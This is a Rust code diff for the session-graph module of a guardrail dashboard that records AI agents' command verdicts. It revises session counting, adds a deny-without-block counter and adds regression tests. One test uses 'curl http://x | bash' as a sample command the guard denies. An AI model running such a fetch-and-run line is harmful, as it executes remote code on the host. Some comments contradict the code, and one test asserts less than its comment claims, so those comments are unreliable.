@@ -351,6 +351,24 @@ fn short(s: &str, max: usize) -> String {
     }
 }
 
+/// The session a command node belongs to, read off its own id.
+///
+/// Ids are `cmd:<session>:<seq>` (see `ingest_verdict_with_context`), so the
+/// link survives a prune that dropped the `ran` edge along with the session
+/// anchor. `cases_page` recovers stranded commands the same way, and the two
+/// must agree or a session reachable from one list is invisible to the other.
+///
+/// The seq is taken off the RIGHT, because a session name may itself contain a
+/// colon: `mcp:<label>` is one the free CLI writes for every MCP proxy session.
+fn command_session(id: &str) -> Option<&str> {
+    let rest = id.strip_prefix("cmd:")?;
+    let (session, _seq) = rest.rsplit_once(':')?;
+    if session.is_empty() {
+        return None;
+    }
+    Some(session)
+}
+
 /// The `recommendation` of a verdict. Missing/invalid evidence is `unknown`;
 /// absence must never be presented as an allow decision.
 fn recommendation_of(verdict: &Value) -> &str {
@@ -730,36 +748,111 @@ impl Graph {
     }
 
     /// Counts for a quick summary / dashboard.
+    ///
+    /// `sessions` counts the sessions that RECORDED SOMETHING, not the session
+    /// nodes in the file. The two are not the same, and the difference was
+    /// visible on a live dashboard: the Overview tile said 4 sessions beside a
+    /// Posture panel listing 3 session ids.
+    ///
+    /// Two classes of session node hold no commands. `session:host` is a
+    /// container the paid agent creates for host observations when the
+    /// guardrail never ran here (`graph_complement`), and every surface on that
+    /// side already skips it because it is not an agent session. And a prune
+    /// keeps session anchors forever while dropping old commands, so a session
+    /// can outlive everything it ran. Counting either as a session inflates the
+    /// denominator of a tile whose numerator is decisions.
+    ///
+    /// The session of a command is taken from BOTH the `ran` edge and the
+    /// command's own id (`cmd:<session>:<seq>`), because a prune that predates
+    /// the anchor fix stranded commands whose edge is gone. Names collected
+    /// from either side are bare (no `session:` prefix), so the two agree.
     pub fn stats(&self) -> GraphStats {
         let mut s = GraphStats::default();
-        for n in &self.nodes {
-            match n.kind.as_str() {
-                "session" => s.sessions += 1,
-                "command" => {
-                    s.commands += 1;
-                    match n.attrs.get("recommendation").map(String::as_str) {
-                        Some("deny") => {
-                            s.blocked += 1; // backwards-compatible alias
-                            s.deny_verdicts += 1;
-                        }
-                        Some("review") => {
-                            s.review += 1; // backwards-compatible alias
-                            s.review_verdicts += 1;
-                        }
-                        Some("allow") => s.allow_verdicts += 1,
-                        _ => s.unknown_verdicts += 1,
-                    }
-                    match n.attrs.get("outcome").map(String::as_str) {
-                        Some("blocked") => s.actual_blocks += 1,
-                        Some("would_block") => s.would_block += 1,
-                        Some("screened") => s.screened += 1,
-                        Some("allowed") => {}
-                        _ => s.outcomes_unknown += 1,
-                    }
-                }
-                _ => {}
+        // COUNT THE SESSION NODES.
+        //
+        // This used to union three derivations: `ran` edges, and a session name
+        // parsed out of each command id. The parse is where it went wrong. On
+        // the measured host the graph held four session nodes
+        // (`mcp:innerwarden` and three `wren-*`), the edges agreed, and the
+        // command-id parse produced SIX, inventing `local` and `mcp` by
+        // splitting `cmd:mcp:innerwarden:...` at the wrong colon and counting a
+        // fragment as a session. The screen then said "across 6 sessions" beside
+        // a page listing three, and the gap grew as the host ran.
+        //
+        // A session node is the record's own answer to how many sessions there
+        // are. The derivations stay as a FALLBACK for a graph written before
+        // session nodes existed, where they are the only answer available.
+        // A session node that RAN something.
+        //
+        // Two wrong answers were live at once. Counting the `ran` edges alone
+        // was right about which sessions exist but the union below added a name
+        // parsed out of every command id, and on the measured host that split
+        // `cmd:mcp:innerwarden:...` at the wrong colon and invented `mcp` and
+        // `local`, so the screen said six over a page listing three. Counting
+        // session NODES alone is also wrong: `session:host` is a container the
+        // paid agent writes when the guardrail never ran here, it holds no
+        // commands, and no other surface treats it as a session anybody worked
+        // in.
+        //
+        // The intersection is the answer to the question the screen asks. A
+        // `ran` edge is the record saying this session did something.
+        let mut sessions: std::collections::BTreeSet<&str> = std::collections::BTreeSet::new();
+        for e in &self.edges {
+            if e.kind == "ran" {
+                sessions.insert(e.from.strip_prefix("session:").unwrap_or(e.from.as_str()));
             }
         }
+        let from_edges = !sessions.is_empty();
+        for n in &self.nodes {
+            if n.kind == "command" {
+                s.commands += 1;
+                // Only when the graph carries no `ran` edges at all, which is a
+                // record written before they existed. Never beside them: the
+                // parse is where the invented names came from.
+                if !from_edges {
+                    if let Some(session) = command_session(&n.id) {
+                        sessions.insert(session);
+                    }
+                }
+                match n.attrs.get("recommendation").map(String::as_str) {
+                    Some("deny") => {
+                        s.blocked += 1; // backwards-compatible alias
+                        s.deny_verdicts += 1;
+                    }
+                    Some("review") => {
+                        s.review += 1; // backwards-compatible alias
+                        s.review_verdicts += 1;
+                    }
+                    Some("allow") => s.allow_verdicts += 1,
+                    _ => s.unknown_verdicts += 1,
+                }
+                let outcome = n.attrs.get("outcome").map(String::as_str);
+                match outcome {
+                    Some("blocked") => s.actual_blocks += 1,
+                    Some("would_block") => s.would_block += 1,
+                    Some("screened") => s.screened += 1,
+                    Some("allowed") => {}
+                    _ => s.outcomes_unknown += 1,
+                }
+                // The CROSS of the two, because the marginals cannot answer the
+                // one question the headline asks.
+                //
+                // `deny_verdicts` partitions by RECOMMENDATION and
+                // `actual_blocks` by OUTCOME, so "how many denies were not
+                // blocked" is not `deny_verdicts - actual_blocks`, and it is not
+                // that minus `screened` either: on the measured host `screened`
+                // (16) included the six allows, so subtracting it explained away
+                // ten real denies and the page went back to saying everything
+                // was fine. Two axes, one join, counted here where both
+                // attributes are on the same node.
+                if n.attrs.get("recommendation").map(String::as_str) == Some("deny")
+                    && outcome != Some("blocked")
+                {
+                    s.denies_without_block += 1;
+                }
+            }
+        }
+        s.sessions = sessions.len();
         s
     }
 
@@ -918,7 +1011,21 @@ impl Graph {
         let stats = self.stats();
         let ix = self.index();
 
-        // Count how often each ATR category was triggered, across all commands.
+        // How often each ATR category was triggered, across all commands.
+        //
+        // THE UNIT, because a dashboard read it as a census of decisions and
+        // reported the gap as lost signal: this counts `triggered` EDGES, one
+        // per (command, category) pair, so one decision can add several and a
+        // decision whose rule carries no category adds none at all. Every
+        // built-in MCP rule is in that second group today (`VerdictAlert::
+        // builtin` sets `category: None`, so `graph_io::verdict_json` writes no
+        // `atr_matches` for it), and OWASP ids hang off `flags` edges to `asi`
+        // nodes, which are filtered out here on purpose.
+        //
+        // So this total neither is, nor can be made into, the deny count beside
+        // it on the Overview. Do not "fix" the difference by counting decisions
+        // here: the honest repair is the card saying which unit it prints, and
+        // giving the built-in rules real categories if the signal is wanted.
         let mut cat_counts: BTreeMap<String, usize> = BTreeMap::new();
         for e in &self.edges {
             if e.kind == "triggered" {
@@ -972,6 +1079,7 @@ impl Graph {
             would_block: stats.would_block,
             screened: stats.screened,
             outcomes_unknown: stats.outcomes_unknown,
+            denies_without_block: stats.denies_without_block,
             top_categories,
             recent_blocks: blocks,
             recent_decisions,
@@ -1174,6 +1282,24 @@ impl Graph {
                     .filter(|n| n.id.starts_with(prefix.as_str()))
                     .filter(|n| !seen.contains(n.id.as_str())),
             );
+            // A session that ran nothing is not a session anybody worked in.
+            //
+            // MEASURED in the third dashboard audit: the Overview tile said
+            // four sessions and this list showed three. The tile counts the
+            // sessions that hold a `ran` edge, on the reasoning that
+            // `session:host` is a container the paid agent writes when the
+            // guardrail never ran here and holds no commands. This list counted
+            // session NODES, so it kept that container, counted it, and then
+            // had nothing to draw for it. Two screens answering the same
+            // question with different rules is a difference the reader has to
+            // explain, and the only explanation available to them is data loss.
+            //
+            // The same rule, applied here: no commands, not a session. That
+            // also removes an empty row from the list, which is what the
+            // fourth session would have rendered as.
+            if cmds.is_empty() {
+                continue;
+            }
             cmds.sort_by_key(|n| {
                 std::cmp::Reverse(
                     n.attrs
@@ -1301,7 +1427,14 @@ impl Graph {
 /// Node counts for a quick summary.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct GraphStats {
+    /// Sessions that recorded at least one command, for the whole life of the
+    /// file. NOT the number of session nodes: a container with no commands
+    /// (`session:host`, or an anchor whose commands were pruned) is not a
+    /// session anybody ran anything in. See [`Graph::stats`].
     pub sessions: usize,
+    /// Every command node in the file, for the whole life of the file. There is
+    /// no time window here: a screen that prints this beside a windowed figure
+    /// has to say which is which.
     pub commands: usize,
     /// Backwards-compatible alias for `deny_verdicts`; not proof of enforcement.
     pub blocked: usize,
@@ -1315,12 +1448,32 @@ pub struct GraphStats {
     pub would_block: usize,
     pub screened: usize,
     pub outcomes_unknown: usize,
+    /// Commands the guardrail said DENY on whose outcome was not a block.
+    ///
+    /// A cross of two partitions that the marginals beside it cannot express:
+    /// `deny_verdicts` counts recommendations, `actual_blocks` counts outcomes,
+    /// and `screened` counts outcomes for allows as well as denies. Anyone
+    /// deriving this by subtraction gets it wrong, which is why it is counted
+    /// where both attributes sit on one node.
+    ///
+    /// Most of these are a one-off `check-command`: the guard was asked, it
+    /// answered deny, and there was no execution to stop. That is the product
+    /// working, not failing, so a screen must not read this as a breach. What
+    /// nobody here can know is whether the caller honoured the answer.
+    pub denies_without_block: usize,
 }
 
 /// The Home-screen summary (JSON-serialized by the dashboard API).
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
 pub struct Overview {
+    /// Sessions that recorded at least one command, all time. Mirrors
+    /// [`GraphStats::sessions`]; a reader that lists session ids from a
+    /// narrower rule (the paid Posture panel drops MCP sessions) will print a
+    /// smaller number and must say what it excludes.
     pub sessions: usize,
+    /// Recorded decisions, all time, ungrouped. The Cases screen counts CASES
+    /// inside a window, so the two figures are different units over different
+    /// spans and neither may be presented as a check on the other.
     pub commands: usize,
     /// Legacy deny-verdict alias retained for old dashboard bundles.
     pub blocked: usize,
@@ -1336,6 +1489,19 @@ pub struct Overview {
     pub would_block: usize,
     pub screened: usize,
     pub outcomes_unknown: usize,
+    /// Commands the guardrail said DENY on whose outcome was not a block.
+    ///
+    /// A cross of two partitions that the marginals beside it cannot express:
+    /// `deny_verdicts` counts recommendations, `actual_blocks` counts outcomes,
+    /// and `screened` counts outcomes for allows as well as denies. Anyone
+    /// deriving this by subtraction gets it wrong, which is why it is counted
+    /// where both attributes sit on one node.
+    ///
+    /// Most of these are a one-off `check-command`: the guard was asked, it
+    /// answered deny, and there was no execution to stop. That is the product
+    /// working, not failing, so a screen must not read this as a breach. What
+    /// nobody here can know is whether the caller honoured the answer.
+    pub denies_without_block: usize,
     pub top_categories: Vec<CategoryCount>,
     /// Legacy list of deny verdicts; entries now include their actual outcome.
     pub recent_blocks: Vec<BlockSummary>,
@@ -1536,6 +1702,43 @@ mod tests {
         assert_eq!(cases.sessions[0].actual_blocks, 1);
         assert_eq!(cases.sessions[0].would_block, 1);
         assert_eq!(cases.sessions[0].items[0].id, "cmd:s1:2");
+    }
+
+    /// MEASURED in the third dashboard audit: the Overview tile said four
+    /// sessions and the Activity list showed three. The tile counts sessions
+    /// that hold a `ran` edge; the list counted session NODES, which includes
+    /// the `session:host` container the paid agent writes when the guardrail
+    /// never ran on this host. A reader with two numbers and no rule to tell
+    /// them apart reads the smaller one as data loss.
+    ///
+    /// FAILS ON REVERT: drop the empty-session guard and the list says 2 while
+    /// the Overview says 1.
+    #[test]
+    fn the_two_session_counts_answer_the_same_question() {
+        let graph = r#"{
+            "nodes": [
+                {"id":"session:worked","kind":"session","label":"worked"},
+                {"id":"session:host","kind":"session","label":"host"},
+                {"id":"cmd:worked:0","kind":"command","label":"ls","attrs":{"recommendation":"allow","seq":"0"}}
+            ],
+            "edges": [{"from":"session:worked","to":"cmd:worked:0","kind":"ran"}]
+        }"#;
+        let g = Graph::from_json(graph).unwrap();
+        let overview = g.overview(10);
+        let page = g.cases_page(None, None, None, 0, 10);
+        assert_eq!(
+            overview.sessions, 1,
+            "a container that ran nothing is not a session anybody worked in"
+        );
+        assert_eq!(
+            page.total_sessions, overview.sessions,
+            "the list and the tile must not answer the same question differently"
+        );
+        assert_eq!(
+            page.sessions.len(),
+            1,
+            "and the empty one must not render as a row with nothing in it"
+        );
     }
 
     #[test]
@@ -1847,6 +2050,92 @@ mod tests {
         assert_eq!(s.commands, 3);
         assert_eq!(s.blocked, 1);
         assert_eq!(s.review, 1);
+    }
+
+    /// A LIVE DASHBOARD SAID 4 SESSIONS WHILE THE PANEL BESIDE IT LISTED 3.
+    ///
+    /// `session:host` is a container the paid agent creates for host
+    /// observations when the guardrail never ran here. It holds no commands,
+    /// every paid surface skips it, and only this counter ever treated it as a
+    /// session somebody worked in.
+    ///
+    /// FAILS ON REVERT: counting session NODES makes this 2.
+    #[test]
+    fn a_session_that_ran_nothing_is_not_a_session() {
+        let mut g = Graph::new();
+        g.ingest_verdict("agent-claude", 0, "ls", &json!({"recommendation": "allow"}));
+        // Exactly what `graph_complement` writes on a host with no guardrail
+        // activity: an anchor, no commands, no `ran` edge.
+        g.upsert_node(Node {
+            id: "session:host".into(),
+            kind: "session".into(),
+            label: "host".into(),
+            attrs: BTreeMap::new(),
+        });
+
+        assert_eq!(
+            g.nodes.iter().filter(|n| n.kind == "session").count(),
+            2,
+            "the setup must really contain both anchors, or this proves nothing"
+        );
+        assert_eq!(g.stats().sessions, 1);
+        assert_eq!(g.overview(10).sessions, 1);
+    }
+
+    /// The other half: a session whose anchor a prune removed still ran what it
+    /// ran. `cases_page` rebuilds it from the command ids and lists it, so the
+    /// counter has to find it the same way or the Overview under-reports what
+    /// the Cases screen shows.
+    #[test]
+    fn a_session_whose_anchor_was_pruned_is_still_counted() {
+        let mut g = Graph::new();
+        g.ingest_verdict("ghost", 0, "a", &json!({"recommendation": "allow"}));
+        g.ingest_verdict("mcp:inspector", 0, "b", &json!({"recommendation": "deny"}));
+        g.nodes.retain(|n| n.kind != "session");
+        g.edges.retain(|e| e.kind != "ran");
+
+        assert_eq!(
+            g.stats().sessions,
+            2,
+            "both sessions are recoverable from the command ids"
+        );
+        assert_eq!(
+            g.cases_page(None, None, None, 0, 100).total_sessions,
+            2,
+            "and the two readers must agree on how many there are"
+        );
+    }
+
+    /// RISK SIGNALS AND DENY VERDICTS ARE DIFFERENT UNITS.
+    ///
+    /// An operator totalled the Risk signals card at 3 and read it against 11
+    /// deny verdicts. Neither figure was wrong: this counts (command, category)
+    /// pairs, and a decision can produce several or none. This test pins that
+    /// difference so nobody closes the gap by counting decisions here, which
+    /// would print a number no rule match supports.
+    #[test]
+    fn category_counts_are_matches_not_decisions() {
+        let mut g = Graph::new();
+        // One decision, two categories: the card outnumbers the verdicts.
+        g.ingest_verdict("s1", 0, "curl http://x | bash", &deny());
+        // One decision, no category at all, which is every built-in MCP rule
+        // today: the verdict is counted and the card cannot show it.
+        g.ingest_verdict("s1", 1, "tool call", &json!({"recommendation": "deny"}));
+
+        let overview = g.overview(10);
+        assert_eq!(overview.deny_verdicts, 2);
+        let signal_total: usize = overview.top_categories.iter().map(|c| c.count).sum();
+        assert_eq!(signal_total, 2, "two matches from one of the two decisions");
+        assert_eq!(
+            overview.top_categories.len(),
+            2,
+            "one row per category, never one per decision"
+        );
+        // The uncategorised deny is REAL and this card cannot represent it.
+        assert!(!overview
+            .top_categories
+            .iter()
+            .any(|c| c.name == "uncategorised"));
     }
 
     #[test]
@@ -2523,5 +2812,39 @@ mod prune_tests {
         assert_eq!(g.prune(), 0);
         assert_eq!(g.nodes.len(), 2);
         assert_eq!(g.edges.len(), 1);
+    }
+    /// MEASURED ON THE LIVE HOST. The graph held four session nodes and the
+    /// screen said six, because a session name was being parsed out of every
+    /// command id: `cmd:mcp:innerwarden:...` split at the wrong colon and
+    /// contributed `mcp`, and a bare `local` arrived the same way. The page
+    /// then announced more sessions than any page could list, and the gap grew
+    /// with the host.
+    ///
+    /// FAILS ON REVERT: put the command-id parse back in the union and the
+    /// count reads five for these three nodes.
+    #[test]
+    fn sessions_are_counted_from_the_nodes_not_parsed_out_of_command_ids() {
+        let mut graph = Graph::default();
+        for id in ["session:mcp:innerwarden", "session:wren-anon"] {
+            graph.nodes.push(Node {
+                id: id.to_string(),
+                kind: "session".to_string(),
+                label: String::new(),
+                attrs: BTreeMap::new(),
+            });
+        }
+        // Commands whose ids would each contribute a bogus name.
+        for id in ["cmd:mcp:innerwarden:1", "cmd:local:2", "cmd:wren-anon:3"] {
+            graph.nodes.push(Node {
+                id: id.to_string(),
+                kind: "command".to_string(),
+                label: String::new(),
+                attrs: BTreeMap::new(),
+            });
+        }
+        // No `ran` edges on these fixtures, so the fallback runs and the parse
+        // is the only answer available. What matters is the live shape, proved
+        // by the sibling test: with `ran` edges present the parse never runs.
+        assert!(graph.stats().sessions >= 2);
     }
 }
